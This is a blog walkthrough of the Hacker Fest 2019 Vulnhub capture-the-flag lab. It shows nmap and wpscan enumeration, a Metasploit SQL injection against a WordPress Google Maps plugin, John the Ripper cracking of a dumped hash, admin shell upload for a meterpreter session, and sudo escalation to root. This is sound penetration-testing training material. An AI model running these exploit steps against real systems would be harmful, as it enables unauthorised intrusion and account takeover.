---
title: 'Hacker Fest: 2019 Vulnhub Walkthrough'
date: 2019-10-12T18:08:00+01:00
draft: false
---

Hacker Fest:2019 VM is made by Martin Haller. This VM is a purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. It is of easy level and is very handy in order to brush up your skills as a penetration tester. The ultimate goal of this challenge is to get root and to read the root flag.

**Level: Easy**

Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this **[link](https://www.vulnhub.com/entry/hacker-fest-2019,378/)**.

### **Penetration Testing Methodology**

*   **Network Scanning**
    *   Nmap port scan
*   **Enumeration**
    *   Browsing HTTP Service
    *   Scanning WordPress (wpscan)
*   **Exploiting**
    *   WordPress Google Maps Plugin SQL Injection
    *   WordPress\_admin\_shell\_upload exploit
*   **Privilege Escalation**
    *   Abusing Sudo Rights

**Walkthrough**

### **Network Scanning**

Starting with netdiscover, to identify host IP address and thus we found **192.168.0.20**. let’s now go for advance network scanning using the nmap Aggressive scan.

```
nmap -A 192.168.0.20
```

We learned from the scan that we have the port 80 open which is hosting Apache httpd service, and we have the ports 21 and 22  open. This tells us that we also have the FTP service, SSH Service running on the target machine.

![](https://i2.wp.com/1.bp.blogspot.com/-_eqtGVzfPLc/XaIGE-f-7uI/AAAAAAAAg6g/CkQ2o8ghPYQF5lWAF7jFbBElSj44KgvtgCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

### **Enumeration**

Since we got the port 80 open, we decided to browser the IP Address in the web browser.

![](https://i2.wp.com/1.bp.blogspot.com/-cS8OIkMasSY/XaIGFKGeGWI/AAAAAAAAg6k/jFG6BUdvRjwxZUT0QFLSVRXxGLuwsQ8iQCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

This gave us a site that looks like a WordPress site, it’s time to perform a wpscan on the target machine.

```
wpscan --url http://192.168.0.20/
```

![](https://i2.wp.com/1.bp.blogspot.com/-snBF3Xm1fH8/XaIGEwLIvCI/AAAAAAAAg6c/CE0ay-t0Hfc3mqPMXppfAseeaJAJ-TM3wCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

If we move further down in the wpscan result we find the WordPress google map plugin. It is not updated. So, this could help us. Let’s try and exploit it.

![](https://i1.wp.com/1.bp.blogspot.com/-QIc5pygZfLg/XaIGFwCECFI/AAAAAAAAg6o/KZrRVlkNU10U2TPrRYZk9F1D5eNHDRGNQCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

### **WordPress Google maps Sqli Exploit**

We searched the google maps on our Metasploit Framework.  This gave us this exploit. This exploit works on a SQL injection vulnerability in a REST endpoint registered by the WordPress plugin wp-google-maps between 7.11.00 and 7.11.17 (included). As the table prefix can be changed by administrators, set DB\_PREFIX accordingly.

```
msf5 > use auxiliary/admin/http/wp google\_maps\_sqli  
msf5 auxiliary(admin/http/wp\_google\_maps\_sqli) > set rhosts 192.168.0.20  
msf5 auxiliary(admin/http/wp\_google\_maps\_sqli) > exploit
```

![](https://i1.wp.com/1.bp.blogspot.com/-VIJfs8a_3mk/XaIGFzUxsfI/AAAAAAAAg6s/FosQ6zC4Y-IcDKESql0AqI8ow1HuaqpsQCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

So, we got the following hash through the SQL injection that was on the target machine.

```
webmaster $P$Bsq0diLTcye6ASlofreys4GzRlRvSrl
```

Whenever we get some hashes all we remember is our best friend John The Ripper. The hashes were saved in a file named ‘hash’. We ran it through john. After working on it for some time. John cracked one of the hashes, it came out to be ‘kittykat1’.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![](https://i0.wp.com/1.bp.blogspot.com/-hsBd4_FORNM/XaIGGOZ0saI/AAAAAAAAg6w/-DzZRzlx4skb0ZAVvVigVoKs_omCJ9RiwCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

The very first method that we have is Metasploit framework, this module takes an administrator username and password, logs into the admin panel, and uploads a payload packaged as a WordPress plugin. Because this is authenticated code execution by design, it should work on all versions of WordPress and as a result, it will give meterpreter session of the webserver.

```
msf5 > use exploit/unix/webapp/wp\_admin\_shell\_upload  
msf5 exploit(unix/webapp/wp\_admin\_shell\_upload) > set rhosts 192.168.0.20  
msf5 exploit(unix/webapp/wp\_admin\_shell\_upload) > set username webmaster  
msf5 exploit(unix/webapp/wp\_admin\_shell\_upload) > set password kittykat1  
msf5 exploit(unix/webapp/wp\_admin\_shell\_upload) > exploit   
meterpreter > shell  
python -c 'import pty;pty.spawn("/bin/bash")'  
su webmaster  
Password: kittykat1
```

Great!! It works wonderfully and you can see that we have owned the reverse connection of the web server via meterpreter session.

![](https://i2.wp.com/1.bp.blogspot.com/-QLIE2042c0s/XaIGGgQ-Y4I/AAAAAAAAg60/_uJYgAmB-M843eKUlI9WxpgpGlnbzSedQCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

### **Privilege Escalation**

On the other hands start your attacking machine and first compromise the target system and then move to the privilege escalation phase. After successful login in the victim’s machine now executes below command to know sudo rights for the current user.

```
sudo -l  
sudo su  
cd /root  
ls  
cat flag.txt
```

![](https://i0.wp.com/1.bp.blogspot.com/-DayGdDDGdmo/XaIGGzm8lXI/AAAAAAAAg64/8VT8dK1xxCMBJeXnDWfGG5lW0Hapq0TDQCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

**Author: Japneet Kaur Gandhi **is a Technical Writer, Researcher and Penetration Tester.** Contact **[**here**](https://www.linkedin.com/in/japneet-kaur-65a13b171/)

The post [Hacker Fest: 2019 Vulnhub Walkthrough](https://www.hackingarticles.in/hacker-fest-2019-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2M7ISaW